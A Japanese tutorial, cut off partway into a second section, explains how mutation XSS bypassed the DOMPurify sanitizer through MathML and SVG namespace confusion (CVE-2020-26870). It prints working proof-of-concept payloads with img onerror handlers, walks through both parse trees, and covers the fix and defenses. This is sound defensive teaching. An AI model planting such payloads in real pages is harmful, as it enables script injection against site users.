- From SVG and back — DOMPurify < 2.2.2 bypass（Daniel Santos、2020） — https://vovohelo.medium.com/from-svg-and-back-yet-another-mutation-xss-via-namespace-confusion-for-dompurify-2-2-2-bypass-5d9ae8b1878f
- Exploring the DOMPurify library: Bypasses and Fixes（Kevin Mizu、2024） — https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes
- Attack Classes & Bypass History（cure53/DOMPurify Wiki） — https://github.com/cure53/DOMPurify/wiki/Attack-Classes-&-Bypass-History
- Escaping '<' and '>' in attributes（Google Bug Hunters） — https://bughunters.google.com/blog/escaping-and-in-attributes-how-it-helps-protect-against-mutation-xss

---

## DOMPurifyバイパス：MathML名前空間混同（CVE-2020-26870）

このセクションでは、HTMLサニタイザー（入力HTMLから危険な要素・属性を除去して安全なHTMLに変換するライブラリ）のデファクトスタンダードである **DOMPurify** を、Michał Bentkowski（Securitum所属のセキュリティ研究者、Twitter/Xでは @SecurityMB）が2020年に破った手法を、原理のレベルまで掘り下げて解説する。この脆弱性は **CVE-2020-26870** として登録され、DOMPurify **2.0.17未満**の全バージョンが影響を受けた。

キーワードは3つある。**mutation XSS（mXSS）**、**名前空間混同（namespace confusion）**、そして **MathML**。これらが組み合わさると、「サニタイザーが検査した時点では完全に無害だったHTML」が、ブラウザに再びパース（構文解析）された瞬間に「実行可能なJavaScriptを含む危険なHTML」へと化ける。サニタイザーは自分が安全だと判定したものしか出力しないのに、その出力が後から勝手に変異（mutate）してしまうのだ。これがこの攻撃クラスの怖さであり、面白さでもある。

### 前提知識1：mutation XSS（mXSS）とは何か

**mutation XSS（変異型XSS、mXSS）**とは、「一度は安全と判定された（あるいは無害な形に整形された）HTML文字列が、ブラウザによって再解釈された際にDOMツリー（HTML要素の親子関係を表す木構造）が変化し、その結果として危険なコードが出現する」タイプのXSSである。2013年にMario Heiderichらの論文「mXSS attacks: attacking well-secured web-applications by using innerHTML mutations」で体系化された。

mXSSを理解する鍵は、次の事実である。

> **HTML文字列 → DOMツリー → HTML文字列、という往復（serialize-parse roundtrip、シリアライズ／再パースの往復）は、必ずしも元の文字列を返さない。**

普通に考えれば、「あるDOMツリーをHTML文字列に書き出し（シリアライズ、serialize：DOMを文字列表現に変換すること）、それをもう一度パースすれば、同じDOMツリーに戻る」はずである。しかしHTMLのパース規則は非常に複雑で、この往復が **べき等（idempotent、何度やっても結果が変わらない性質）ではない**ケースが多数存在する。サニタイザーが「DOMツリーAは安全だ」と判定してAを文字列に書き出しても、アプリケーションがその文字列を `innerHTML` に代入したときにブラウザが作るのは「別のDOMツリーB」かもしれない。Bに危険な要素が含まれていれば、サニタイズは実質的に無意味になる。

CVE-2020-26870のCVE公式説明文も、まさにこの点を突いている。

```
Cure53 DOMPurify before 2.0.17 allows mutation XSS. This occurs because
a serialize-parse roundtrip does not necessarily return the original DOM
tree, and a namespace can change from HTML to MathML, as demonstrated by
nesting of FORM elements.
```

（訳：DOMPurify 2.0.17未満はmutation XSSを許す。これは、シリアライズ／再パースの往復が必ずしも元のDOMツリーを返さず、FORM要素のネストによって実証されるように、名前空間がHTMLからMathMLへ変化しうるために起こる。）

> 出典: CVE-2020-26870（NVD）、CVSS 3.1: 6.1（MEDIUM）、公開日: 2020年10月7日

### 前提知識2：DOMPurifyはなぜ「2回パース」するのか

なぜ「往復」が起きるのかを理解するには、DOMPurifyの動作原理を知る必要がある。DOMPurifyは概ね次の手順で動く。

1. アプリケーションから、信頼できないHTML文字列（例: ユーザーが投稿したコメント）を受け取る。
2. その文字列を **一度パースしてDOMツリーを作る**（内部的には `DOMParser` や、`<template>`要素の `innerHTML` などを利用）。—— これが **1回目のパース**。
3. できたDOMツリーを走査し、許可リスト（allow-list）に載っていない要素（例: `<script>`）や属性（例: `onerror`）を **削除**する。残った要素は「安全」とみなす。
4. サニタイズ済みのDOMツリーを再び **HTML文字列にシリアライズ**して呼び出し元に返す（`innerHTML` を読み出す等）。
5. アプリケーションはその文字列を、たとえば `element.innerHTML = purified` のように **DOMへ挿入する**。—— ここでブラウザによる **2回目のパース**が発生する。

つまりDOMPurifyが「安全だ」と判断するのはステップ3の**1回目のパース結果**に対してだが、実際に画面に反映されるのはステップ5の**2回目のパース結果**である。この2つが食い違えば、mXSSが成立する。攻撃者のゴールは、「1回目のパースでは無害に見えるが、2回目のパースで危険物が出現する」ような入力を作り込むことだ。

なお、DOMPurifyの後の修正（PR #495）では、この「文書パースモード（document parsing）とフラグメントパースモード（fragment parsing）の差異」による再パースの揺れをさらに減らすため、`insertAdjacentHTML` への依存を完全に廃止し、可能な限りDOMノードを直接操作するように変更されている（詳細は後述の修正パート）。

### 前提知識3：HTMLの3つの名前空間と「統合ポイント」

この攻撃の心臓部が **名前空間（namespace）**である。モダンなHTMLパーサは、1つのHTML文書の中で3種類の言語を扱い分けている。

- **HTML名前空間**（`http://www.w3.org/1999/xhtml`）: 通常のHTML要素。
- **SVG名前空間**（`http://www.w3.org/2000/svg`）: ベクタ画像用の要素。`<svg>` 要素をトリガーに切り替わる。
- **MathML名前空間**（`http://www.w3.org/1998/Math/MathML`）: 数式表現用の要素。`<math>` 要素をトリガーに切り替わる。

同じ要素名でも、**どの名前空間に属するかによってパース規則も振る舞いも変わる**。特に重要なのが `<style>` 要素の挙動の違いである。

- **HTML名前空間の `<style>`**: 「raw text要素（生テキスト要素）」として扱われ、`</style>` が現れるまでの中身は**すべてただのテキスト（CSS）として読まれる**。つまり `<style><img src=x onerror=alert(1)></style>` と書いても、この `<img>` は要素ではなく**文字列**であり、何も起きない。
- **SVG／MathML名前空間の `<style>`**: 外来（foreign）要素として扱われ、中身は **通常のマークアップとしてパースされる**。つまり同じ `<style><img ...></style>` でも、内側の `<img>` は**本物の要素**として木に組み込まれる。

この「`<style>`の中身がテキストなのか要素なのか」という差が、後で決定打になる。

#### 統合ポイント（integration point）とmglyph/malignmarkの特殊性

MathMLやSVGの領域の中に、「ここから先はまたHTMLとして解釈してよい」という橋渡し地点がある。これを **統合ポイント（integration point）**と呼ぶ。

- **MathMLテキスト統合ポイント（MathML text integration point）**: `<mi>`, `<mo>`, `<mn>`, `<ms>`, `<mtext>` の5要素。これらの**子として現れるタグは、原則HTML名前空間として解釈される**（＝MathMLの世界からHTMLの世界へ抜け出せる）。
- **HTML統合ポイント（HTML integration point）**: MathMLの `<annotation-xml>`（一定の条件下）や、SVGの `<foreignObject>`, `<desc>`, `<title>` など。

ところが、この「MathMLテキスト統合ポイントの子はHTMLになる」というルールには **2つの例外**がある。それが本脆弱性の主役、**`<mglyph>` と `<malignmark>`** である。

> HTML仕様の外来コンテンツ（foreign content）に関する規則では、`<mglyph>` と `<malignmark>` は、**MathMLテキスト統合ポイントの「直接の子」である場合に限り、HTMLではなくMathML名前空間のまま**留まる。他のすべてのタグはHTMLに抜け出すのに、この2つだけはMathMLに残る。

「直接の子であるかどうか」で名前空間が変わる—— この一文が攻撃の全てを決める。もし攻撃者が「初回パースでは `<mglyph>` を統合ポイントの**直接の子ではない**位置に、再パースでは**直接の子**になる位置に」動かせれば、`<mglyph>` の名前空間をHTML→MathMLへ「変異」させられる。

> 出典: HTML Standard（tree construction / foreign content の規則）、および DOMPurify Wiki: Attack Classes & Bypass History — https://github.com/cure53/DOMPurify/wiki/Attack-Classes-&-Bypass-History

### 前提知識4：ネストした`<form>`という「所有権変異ガジェット」

最後の部品が **`<form>`要素のネスト（入れ子）に関するHTMLパーサの癖**である。

HTMLパーサは内部に **form element pointer（フォーム要素ポインタ）**という状態を持つ。`<form>` の開始タグを見つけると、パーサは「今このフォームの中にいる」という印としてこのポインタをセットする。そして**すでにフォームが開いている状態で新たな `<form>` に出会うと、2つ目の `<form>` は無視され、要素として作られない**（HTMLではフォームを入れ子にできないため）。

ところが——この「フォームは入れ子にできない」ルールの適用のされ方が、**通常のHTMLコンテキストと、MathML/SVGの外来コンテンツの中とで異なる**。外来コンテンツのパース中には、form element pointerのチェックが通常どおり働かず、**一時的にネストした`<form>`が作られてしまう**瞬間がある。これが本攻撃の「所有権変異ガジェット（ownership mutation gadget）」——ある要素の「親（＝所有者）」を初回パースと再パースの間ですり替える仕掛け——として機能する。

要するに：**初回パースでは幻の2つ目の `<form>` が存在し、`<mglyph>` の親になる。しかし再パースでは、DOMPurifyがシリアライズし直した文字列を素直にパースする過程でその2つ目の `<form>` が消え、`<mglyph>` の親が `<mtext>` に繰り上がる。** 親が変われば、前述の「mglyphは統合ポイントの直接の子ならMathMLに残る」ルールが発動し、名前空間が切り替わる。

### 攻撃の全体像：ペイロードとステップバイステップ

これらの部品が揃ったところで、Bentkowskiのペイロード本体を見よう。

```html
<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>
```

一見すると、`<form>` が2つあり、閉じタグの位置がめちゃくちゃで、`<img>` はどう見ても `<style>` の内側にある「壊れたHTML」である。だが、この「壊れ方」こそが計算され尽くしている。なぜこれが動くのか。**初回パース（DOMPurifyが見る木）**と**再パース（ブラウザが最終的に作る木）**を分けて追う。

#### ステップA：初回パース（DOMPurifyが検査する、無害に見える木）

DOMPurifyがこの文字列を最初にパースすると、外来コンテンツ内のネスト`<form>`の癖により、おおよそ次のような構造ができる。

```
form (HTML名前空間)
└─ math (MathML名前空間)
   └─ mtext (MathMLテキスト統合ポイント)
      └─ form (2つ目の form ← 外来コンテンツの癖で「一時的に」出現)
         └─ mglyph (★HTML名前空間★ ← 統合ポイントの「直接の子」ではなく、間にformが挟まっているため)
            └─ style (HTML名前空間 ← 親のmglyphがHTMLなので)
               └─ "(テキスト)</math><img src onerror=alert(1)>"
```

ここでの決定的なポイントは2つ。

1. **`<mglyph>` はHTML名前空間にいる。** なぜなら、`<mtext>`（統合ポイント）の**直接の子ではなく**、間に2つ目の `<form>` が挟まっているからだ。「直接の子でなければ例外は発動しない」ので、mglyphはごく普通のHTML要素扱いになる。
2. **`<style>` もHTML名前空間にいる。** 親のmglyphがHTMLだから。前述のとおりHTMLの `<style>` は raw text要素なので、その後ろに続く `</math><img src onerror=alert(1)>` は**すべて「styleの中身のテキスト文字列」として飲み込まれる**。この文字列内には `</style>` が無いので、`<img>` が独立した要素になることは決してない。

結果、DOMPurifyの目に映るのは「form / math / mtext / form / mglyph / style（中身はただのテキスト）」という、**すべて許可リストに載った無害な要素だけの木**である。`<img>` という要素も、`onerror` という属性も、DOMツリー上には**存在しない**（テキストの一部でしかない）。だからDOMPurifyは何も削除するものを見つけられず、この木をそのまま「安全」と判定してシリアライズし、呼び出し元に返す。

> **なぜ動くのか（ステップAの一文解説）**: `onerror` を含む文字列が、独立した `<img>` 要素の属性ではなく `<style>` の生テキストの一部になっているため、サニタイザーには「除去すべき危険な属性」が一切見えない。危険物は「テキストに変装」して検問を通過する。

#### ステップB：再パース（ブラウザが実際に作る、危険な木）

DOMPurifyが返した文字列を、アプリケーションが `innerHTML` に代入すると、ブラウザが**2回目のパース**を行う。ここで木が「変異」する。DOMPurify Wiki の記述を借りれば、変化は次のとおり。

> On reparsing, the second HTML form is not created and mglyph becomes a direct child of mtext, placing it in the MathML namespace. Because of that, style is also in MathML namespace, hence its content is not treated as text. The `</math>` tag closes the math element, and now the img element is created in HTML namespace, leading to XSS.
>
> （再パース時には2つ目のHTML formは作られず、mglyphがmtextの直接の子になり、MathML名前空間に置かれる。そのためstyleもMathML名前空間になり、その中身はテキストとして扱われない。`</math>` タグがmath要素を閉じ、img要素がHTML名前空間で作られ、XSSに至る。）

再パース後の木は概ねこうなる。

```
form (HTML名前空間)
└─ math (MathML名前空間)
   └─ mtext (MathMLテキスト統合ポイント)
      └─ mglyph (★今度はMathML名前空間★ ← mtextの「直接の子」になったので例外が発動)
         └─ style (★MathML名前空間★ ← 親がMathMLになったので外来要素扱い)
            └─ (中身は「テキスト」ではなく「マークアップ」としてパースされる)
img (HTML名前空間・onerror付き) ← </math> でmathを閉じた後、HTMLに戻って本物のimg要素に!
```

連鎖を分解すると：

1. 2つ目の `<form>` が**消える**（form element pointerのルールで、素直なパースでは入れ子formが作られない）。
2. その結果 `<mglyph>` の親が `<mtext>` に繰り上がり、**統合ポイントの直接の子**になる。
3. mglyph/malignmark例外が発動し、`<mglyph>` は **MathML名前空間**に入る。
4. 子の `<style>` も**MathML名前空間**になる。MathMLの `<style>` は外来要素なので、中身は**マークアップとしてパースされる**（もう「テキスト」ではない）。
5. その中身にある `</math>` が、いま**本当にmath要素を閉じる**。パーサはMathMLの世界から抜け、**HTML名前空間に戻る**。
6. 続く `<img src onerror=alert(1)>` が、**HTML名前空間の本物の `<img>` 要素**として生成される。`onerror` は生きたイベントハンドラだ。
7. `src` が空（または不正）なので画像読み込みが失敗し、`onerror` が発火して `alert(1)` が実行される —— **XSS成立**。

> **なぜ動くのか（ステップBの一文解説）**: `<style>` の名前空間がHTML→MathMLへ「変異」した瞬間に、その内側が「テキスト」から「要素」へと解釈が切り替わり、テキストに変装していた `<img onerror>` が本物の要素として"解凍"される。DOMPurifyは変異前の木しか見ていないので、この解凍を防げない。

同じバイト列 `<img src onerror=alert(1)>` が、初回パースでは「styleの生テキスト」、再パースでは「実行可能なimg要素」——文脈（名前空間）が違えば同じ文字列が別物になる、という**名前空間混同（namespace confusion）**の本質がここに凝縮されている。

なお `src` の書き方には流派があり、`<img src onerror=alert(1)>`（src空）でも `<img src=x onerror=alert(1)>`（存在しないパス）でもよい。いずれも「画像の読み込みに失敗させて `onerror` を発火させる」という同じ目的で、XSSの定番テクニックである。

### この攻撃が示す一般原理：なぜサニタイザーは名前空間に弱いのか

この一件から学ぶべき最重要の教訓は次の点だ。

> **「タグ名（ローカル名）だけを見て安全性を判断してはいけない。要素が実際にどの名前空間にいるかを見なければならない。」**

DOMPurify 2.0.17以前は、要素を「タグ名」ベースの許可リストで判定していた。`mglyph` は許可リストに入っている（MathMLの正当な要素だから）。しかし、**HTML名前空間にいる `mglyph`** は、本来この世に存在してはいけない異常な要素である（mglyphはMathML専用の名前だから）。初回パースでたまたまHTML名前空間の `mglyph` が生まれても、旧DOMPurifyは「mglyphは許可リストにあるからOK」と通してしまった。この「名前空間の取り違え」を見逃したことが、変異の余地を残した。

より一般化すると、mXSSの温床は次の3条件が揃うときだ。

1. サニタイザーが **serialize→parse の往復**を（明示的または暗黙に）行う。
2. HTMLパースに **往復でべき等でない**箇所がある（名前空間の切り替え、`<style>`/`<textarea>`/`<title>`等のraw text要素、コメント、属性のエスケープ差など）。
3. サニタイザーが **1回目のパース結果**を検査し、実行されるのは**2回目のパース結果**である。

名前空間混同は、この(2)の中でも特に強力なガジェットである。なぜなら、要素の名前空間はDOMツリー上の**親子関係**から動的に決まり、その親子関係は「ネストformの癖」のようなパーサの細かな挙動で往復のたびに変わりうるからだ。

### CVE-2020-26870：バージョン・タイムライン・影響

バージョン依存の攻撃なので、対象と修正状況を明記しておく（陳腐化への注意）。

| 項目 | 内容 |
|---|---|
| CVE番号 | **CVE-2020-26870** |
| 対象製品 | Cure53 **DOMPurify** |
| 影響バージョン | **2.0.17 未満**のすべて |
| 修正バージョン | **2.0.17** |
| CVE公開日 | 2020年10月7日 |
| CVSS 3.1 基本値 | **6.1（MEDIUM）** |
| 発見・報告者 | **Michał Bentkowski**（Securitum） |
| 攻撃前提 | サニタイズ結果が `innerHTML` 等でDOMに挿入され、MathML/SVGを含む外来コンテンツがサニタイズ対象に含まれること（DOMPurifyの既定はHTML/MathML/SVGを全てサニタイズ対象とする） |

CVSSが「6.1 / MEDIUM」なのは、XSS一般と同様に「利用者の操作（被害者が細工されたコンテンツを含むページを閲覧すること、UI:R）」を要し、また影響が機密性・完全性への部分的影響（C:L/I:L）にとどまる評価がなされているためである。ただし実際にはセッション乗っ取りやアカウント侵害に直結しうるので、実務上のインパクトは軽視できない。

**重要な陳腐化の注意**: この個別のペイロード（form/math/mglyph/style）は 2.0.17（2020年）で修正済みであり、現行のDOMPurify（3.x系）では動作しない。学習の目的は「このペイロードを撃つこと」ではなく、**名前空間混同という攻撃クラスの原理を理解すること**にある。実際、同じ原理の別バリアントがその後も繰り返し発見されており（後述）、この攻撃クラス自体は今も生きている。

### 修正：`_checkValidNamespace` と Pull Request #495

Bentkowskiは脆弱性を報告するだけでなく、修正案そのものも提示した。それが DOMPurify の **Pull Request #495「Harden protection against mutation XSS caused by namespace switching」**（作者 securityMB＝Bentkowski本人、2020年12月17日マージ）である。中核は新設された **`_checkValidNamespace`** 関数で、**各ノードを「親の名前空間」に照らして検証し、仕様上ありえない名前空間の切り替えを検出したらそのノードを削除する**というものだ。

`_checkValidNamespace` が強制する5つの検証ルール（PR #495より）：

1. **SVGからHTMLへの名前空間切り替え**は、`<svg>` タグを経由する場合にのみ許可される。
2. **MathMLからHTMLへの名前空間切り替え**は、`<math>` タグを経由する場合にのみ許可される。
3. **HTMLから外来コンテンツへの切り替え**は、指定された統合ポイント（MathMLテキスト統合ポイントやHTML統合ポイント）においてのみ許可される。
4. **SVG／MathML固有の要素**が、HTML名前空間に出現することは許可されない。誤配置された要素は**削除**される。
5. 逆に、**SVG/MathML名前空間にのみ属すべきHTML要素**が誤った名前空間に配置されている場合も**削除**される。

このルール4こそが、まさに本攻撃を無力化する。初回パースで生まれた「**HTML名前空間の `mglyph`**」は、ルール4に照らすと「HTML名前空間に存在するMathML固有要素」という不正な状態なので、DOMPurifyがサニタイズ段階で**削除**する。危険物を"解凍"するための足場（mglyph→style）がそもそも取り除かれるため、再パースしても何も起きない。

PR #495はさらに、mXSSの温床を減らすための周辺強化も行った。

- **`insertAdjacentHTML` への依存の廃止**: 文書パースモード（document parsing）とフラグメントパースモード（fragment parsing）の差に起因する再パースの揺れを防ぐため、DOMノードを直接扱う方式に変更。これによりserialize-reparseの不一致が生じる余地を削減した。
- **DOM clobbering（DOMクロバリング：`id`/`name`属性でDOMプロパティを上書きしてスクリプトの前提を崩す攻撃）対策**の強化。キャッシュされた、realm安全なアクセサを用いてDOMクロバリングを防止。

> 出典: Harden protection against mutation XSS caused by namespace switching (PR #495) — https://github.com/cure53/DOMPurify/pull/495

なお、DOMPurify Wikiではセキュリティゴールとして、`RETURN_DOM_FRAGMENT: true` を使えばserialize-reparseの過程自体をスキップできるため、mXSSの懸念を根本から回避できることも明記されている。

### 防御策：アプリ側・ライブラリ側でできること

実務者として押さえるべき防御を整理する。

1. **DOMPurifyを最新に保つ**。名前空間混同は一度きりの脆弱性ではなく、次々と新種が見つかる「クラス」である。2.0.17（本CVE）、2.2.2（後述のSVG版）など、修正のたびにバージョンを上げること。バージョン固定（ピン留め）したまま放置するのが最も危険。
2. **不要な外来コンテンツを許可しない**。多くのWebアプリはユーザー入力にMathMLやSVGを本当に必要とはしていない。DOMPurifyの設定で `USE_PROFILES: { html: true }` のようにHTMLのみを許可し、MathML/SVGを対象から外せば、名前空間混同の攻撃面（attack surface）を根本から縮小できる。
3. **可能なら「サニタイズしてから即挿入」以外の設計を検討する**。信頼できないHTMLをそもそもレンダリングしない、テキストとして扱う（`textContent` を使う）、あるいはサーバ側での厳格な検証と組み合わせる、など多層防御にする。
4. **CSP（Content Security Policy）を併用する**。万一サニタイズをすり抜けても、`script-src` を厳格にし、インラインイベントハンドラ（`onerror` 等）を禁止していれば、`onerror=alert(1)` の発火自体をブロックできる可能性がある。ただしCSPはサニタイザーの代替ではなく、最後の砦としての併用が原則。
5. **サニタイザーを自作しない**。名前空間混同やmXSSは、HTMLパーサの深い挙動を知らなければ防げない。DOMPurifyのような、専門家が継続的にバイパスと修正を繰り返してきた実績あるライブラリを使うこと。

### この攻撃クラスの系譜：名前空間混同は繰り返す

Bentkowskiの2.0.17バイパスは孤立した事件ではない。**名前空間混同によるmXSS**は、DOMPurifyの歴史の中で繰り返し現れる主要な攻撃クラスであり、本セクションの技術的価値の核心もそこにある。代表的な系譜を挙げる。

- **2019年（SVG版・DOMPurify < 2.0.x）**: PR #495にも記録されている、SVGを起点とするmXSS。
  ```html
  <svg></p><style><a title="</style><img src onerror=alert(1)>">
  ```
  HTMLの `<p>` がSVG要素の子として出現（仕様違反）。シリアライズ後に再パースされると、外来コンテンツの規則により要素の名前空間が変化し、`<img>` がHTML名前空間で実体化する。原理は本CVEと同型（名前空間の境界と `<style>` のraw text挙動の悪用）。

- **2020年（MathML版・CVE-2020-26870・DOMPurify < 2.0.17）**: 本セクションのBentkowskiの手法。form/math/mtext/mglyph/style。MathMLテキスト統合ポイントを悪用し、HTML `<mglyph>` が不正にHTML名前空間に出現、再パースでMathML名前空間にシフトしてXSSに至る。

- **2020年以降（SVG版・DOMPurify < 2.2.2）**: Daniel Santos（vovohelo）による「From SVG and back, yet another mutation XSS via namespace confusion」。「SVGへ入って、また戻る」ことで名前空間を混同させる別角度のバイパス。`_checkValidNamespace` 導入後も、なお抜け道が残っていたことを示した。

これらに共通する防御原則は、PR #495以降DOMPurifyが確立した次の一文に集約される。

> **「サニタイザーは、ローカルなタグ名だけでなく、要素が実際に属する名前空間で評価しなければならない。」**

> 出典: Attack Classes & Bypass History（cure53/DOMPurify Wiki） — https://github.com/cure53/DOMPurify/wiki/Attack-Classes-&-Bypass-History
> 出典: From SVG and back, yet another mutation XSS via namespace confusion for DOMPurify < 2.2.2 bypass（Daniel Santos） — https://vovohelo.medium.com/from-svg-and-back-yet-another-mutation-xss-via-namespace-confusion-for-dompurify-2-2-2-bypass-5d9ae8b1878f

### 参考：Michał Bentkowski の関連研究

Bentkowskiは2013年よりSecuritumに所属し、Webおよびモバイルアプリのセキュリティ診断・研究・トレーニングに従事している。DOMPurifyやサニタイザーバイパス、プロトタイプ汚染に関心があれば、いずれも一級の教材である。

- **Mutation XSS via namespace confusion -- DOMPurify < 2.0.17 bypass**（本セクションの主題、2020年） — https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/
- **DOMPurify 2.0.0 bypass using mutation XSS**（別のmXSSによる初期のDOMPurifyバイパス）
- **Prototype pollution and bypassing client-side HTML sanitizers**（プロトタイプ汚染〔JavaScriptのプロトタイプチェーンを汚染して既定挙動を書き換える攻撃〕を使い、DOMPurifyを含むクライアント側サニタイザーを破る研究。半自動的な悪用手法の探索も含む）
- **HTML sanitization bypass in Ruby Sanitize < 5.2.1**（Ruby製サニタイザーSanitizeのRELAXED構成を完全にバイパス、2020年）
- **XSS in GMail's AMP4Email via DOM Clobbering**（DOMクロバリングによるGmail AMP4EmailのXSS、Google VRP報告、2019年）
- **Exploiting prototype pollution for RCE in Kibana (CVE-2019-7609)**（プロトタイプ汚染からのリモートコード実行）

講演「A word about DOMPurify bypasses a.k.a why DOM parsing is crazy（DOMPurifyバイパスの話、あるいはなぜDOMパースは狂っているのか）」は、本セクションのテーマそのものを扱っており必見である。

> 出典: Michał Bentkowski 研究インデックス — https://www.bentkowski.info/research/
> 出典: Michał Bentkowski（Securitum 著者ページ） — https://research.securitum.com/authors/michal-bentkowski/

### まとめ

- **CVE-2020-26870**は、DOMPurify < 2.0.17に対する **mutation XSS（mXSS）**であり、その手口は **MathMLの名前空間混同**だった。
- 攻撃の骨格は「**同じ文字列が、初回パースと再パースで別の名前空間に置かれ、`<style>` の中身が『テキスト』から『要素』へ化ける**」こと。ネストした `<form>` を「所有権変異ガジェット」に使い、`<mglyph>` の親を `mtext` に繰り上げることで、mglyph→styleの名前空間をHTML→MathMLへ変異させ、隠していた `<img onerror>` を再パース時に解凍する。
- ペイロード: `<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>`。
- 修正は **`_checkValidNamespace`（PR #495、2020年12月17日マージ）**で、「各ノードを親の名前空間に照らして検証し、HTML名前空間の `mglyph` のような仕様違反要素を削除する」ことにより、変異の足場を除去した。`insertAdjacentHTML` への依存廃止も同時に行われ、serialize-reparseの不一致リスクを低減した。
- 教訓は普遍的で、**サニタイザーはタグ名ではなく実際の名前空間で判断すべし**。そして名前空間混同は一度で終わらず、SVG版・MathML版と形を変えて繰り返し現れる「クラス」であるため、**ライブラリを最新に保ち、不要な外来コンテンツを許可しない**ことが実務上の要である。

---

## 変異XSSによるDOMPurify再バイパス

このセクションでは、HTMLサニタイザのデファクトスタンダードである **DOMPurify** に対して、**変異XSS（mutation XSS, mXSS）** を使って繰り返しバイパスが成立してきた歴史を、仕組みのレベルで解説する。特に次の2本の研究を中心に扱う。

1. Gareth Heyes による「Bypassing DOMPurify again with mutation XSS」（PortSwigger Research, 2020年10月7日公開。DOMPurify < 2.1 に対する再バイパス）
2. Daniel Santos（@bananabr）による DOMPurify < 2.2.2 バイパス（GitHub Issue #482, 2020年11月2日報告）

いずれも「一度サニタイズを通過した無害に見えるHTMLが、ブラウザに再解釈された瞬間に危険なHTMLへ**変異（mutation）**する」という、反射型の素朴なXSSとは根本的に発想の異なる攻撃である。ここを理解すると、「なぜ文字列レベルのフィルタや正規表現によるサニタイズが原理的に脆弱なのか」「なぜDOMベースのサニタイザですら破られるのか」が腑に落ちるはずだ。

---

### 前提: このセクションを読む前に押さえておくこと

#### 変異XSS（mXSS）とは何か

**変異XSS（mutation XSS, mXSS）**とは、「サニタイズ処理を行った時点では安全だった文字列が、ブラウザ（正確にはHTMLパーサ）に読み込まれて実際のDOMツリー（ブラウザ内部でHTMLを表現する木構造のデータ）を組み立てる過程で、**別の（危険な）構造へ勝手に書き換わってしまう**」ことを利用する攻撃である。「変異（mutation）」という名前は、まさにこの「入力文字列が解釈の途中で姿を変える」現象に由来する。

素朴な反射型XSSが「`<script>`という文字列をそのまま埋め込めるか？」を問うのに対し、mXSSは「サニタイザが見ているDOMと、最終的にブラウザが作るDOMが**一致しない**」という食い違い（不整合, discrepancy）そのものを突く。したがって、サニタイザがどれほど厳密に「今見えているDOM」を検査しても、検査後に構造が変わってしまえば意味がない。

#### DOMPurifyの動作モデルと「2回パースされる」という宿命

DOMPurifyの典型的な処理フローは次のとおりである。

1. **1回目のパース**: 受け取ったHTML文字列を、ブラウザのパーサ（`DOMParser`や`template`要素などを利用）で一度DOMツリーに変換する。
2. **サニタイズ（危険なノードの除去）**: できあがったDOMツリーを上から下まで走査（トラバース）し、許可リスト（allow-list, 安全と認められたタグ・属性だけを通す方式）に載っていない要素・属性を削除する。
3. **再シリアライズ（serialize, DOMを文字列HTMLへ戻す処理）**: 掃除の終わったDOMツリーを、`innerHTML`などで取り出せるHTML文字列に戻す。
4. **2回目のパース**: そのサニタイズ済み文字列を、開発者が最終的に `element.innerHTML = purified` のようにページへ挿入すると、**ブラウザがもう一度パースして**本物のDOMを作る。

問題の核心はこの構造にある。**DOMPurifyが検査するのは「1回目のパース」で得たDOMなのに、実際にページに現れて動くのは「2回目のパース」で得たDOM**である。もしこの2回のパースが同じ文字列から**異なる木**を作るなら、1回目では無害だったものが2回目で牙をむく。mXSSとは、この「1回目 ≠ 2回目」を意図的に作り出す技術に他ならない。

> sink（ユーザー入力が最終的に実行・解釈される危険な代入先。例: `innerHTML`, `outerHTML`, `document.write`）に、サニタイズ済みの文字列を渡した瞬間が「2回目のパース」に相当する。

#### なぜ `<style>`・コメント・属性値が鍵になるのか（パーサの再解釈）

mXSSペイロードには、`<style>`、HTMLコメント（`<!-- -->`）、CDATAセクション（`<![CDATA[ ]]>`）、そして**属性値**が頻出する。これは偶然ではなく、いずれも「**文脈（コンテキスト）によって中身の扱いが変わる**」HTMLパーサの性質を突いているためである。中でも決定的なのは次の2点だ。

- **`<style>`・`<title>`・`<textarea>`などは「raw text要素」**: HTML名前空間においては、これらのタグの中身は「タグではなくただのテキスト」として扱われる。つまり `<style><img src=x onerror=alert(1)></style>` の `<img>` は、HTML文脈では**要素ではなく文字列**であり、`onerror`は発火しない。DOMPurifyもこれを「無害なテキスト」と見なして削除しない。**ところが同じ`<style>`が外部名前空間（SVG/MathML）に置かれると raw text ではなくなり、中身が通常のマークアップとして解析され、`<img>`が本物の要素になる**。この「同じタグなのに名前空間で挙動が変わる」ギャップが、mXSSの主戦場である。

- **属性値のシリアライズは `<` `>` `/` をエスケープしない**: DOMがHTML文字列へ戻される（シリアライズされる）とき、属性値の中では `&` や `"` はエスケープされるが、`<`・`>`・`/` は**そのまま**出力される。したがって、ある属性の値が文字列として `</style><img onerror=alert(1)>` を含んでいると、シリアライズ後の文字列にはこの `</style>` がそっくりそのまま現れる。次に `<style>` が「raw text要素」として解釈される文脈で再パースされると、パーサは raw text を読み進める途中でこの `</style>` に到達してそこで`<style>`を閉じてしまい、続く `<img onerror=...>` を**本物のタグ**として解析する。これが典型的な変異である。

この2つを組み合わせると、「サニタイザから見れば、危険なコードは属性値の中に閉じ込められた無害な文字列。しかし再パース時には`<style>`が閉じられて属性の外へ飛び出し、実行可能な要素になる」という、まさに文字列が変異する状況を作れる。

---

### 名前空間（namespace）とintegration pointの基礎

DOMPurifyのmXSSバイパスは、ほぼ例外なく**名前空間の切り替え**を悪用する。ここが本セクション最大の山場なので、丁寧に積み上げる。

#### HTML / SVG / MathML の3つの名前空間と foreign content

ブラウザのHTMLパーサは、1つの文書の中に**3種類の名前空間**の要素を作り分ける。

- **HTML名前空間**（`http://www.w3.org/1999/xhtml`）: 普通の`<div>`や`<img>`など。
- **SVG名前空間**（`http://www.w3.org/2000/svg`）: `<svg>`要素以下。
- **MathML名前空間**（`http://www.w3.org/1998/Math/MathML`）: `<math>`要素以下。

パーサは通常HTML名前空間で動いているが、`<svg>` または `<math>` に出会うと、そこから先を **foreign content（外部コンテンツ）** として扱い、それぞれSVG/MathML名前空間へ切り替える。foreign contentの中では、HTMLとは**異なる解析規則**が適用される。前述の「`<style>`が raw text 要素でなくなる」のもこの規則差の一例である。

#### text integration point と HTML integration point

foreign content一色になると、その中にHTMLを書けなくなってしまい不便である。そこで仕様には、**外部名前空間の中に「ここから先はHTMLとして解析してよい」という穴**が用意されている。これが **integration point（統合点）** だ。2種類ある。

